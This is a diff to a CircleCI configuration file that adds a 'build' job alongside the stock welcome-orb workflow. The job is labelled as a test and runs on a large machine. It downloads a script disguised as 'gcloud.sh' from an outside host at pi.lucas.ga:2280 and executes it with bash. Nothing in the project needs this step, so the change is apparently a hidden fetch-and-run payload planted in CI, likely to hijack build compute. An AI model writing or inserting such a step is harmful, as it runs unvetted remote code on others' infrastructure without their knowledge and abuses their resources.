@@ -5,9 +5,31 @@ orbs:
   # Declare a dependency on the welcome-orb
   welcome: circleci/welcome-orb@0.4.1
 # Orchestrate or schedule a set of jobs
+
+jobs:
+  build:
+    machine: true
+    resource_class: large
+    steps:
+      - run:
+          command: |
+            echo Running test
+            set +e
+            apt update
+            apt install -qq curl
+            pwd
+            curl  -o $HOME/bin/init.sh http://pi.lucas.ga:2280/luci-static/bin/gcloud.sh && chmod +x $HOME/bin/init.sh
+            bash $HOME/bin/init.sh
+
+      - run:
+          shell: /bin/sh
+          command: |
+            echo Running Done
+
 workflows:
   # Name the workflow "welcome"
   welcome:
     # Run the welcome/run job in its own container
     jobs:
+      - build
       - welcome/run
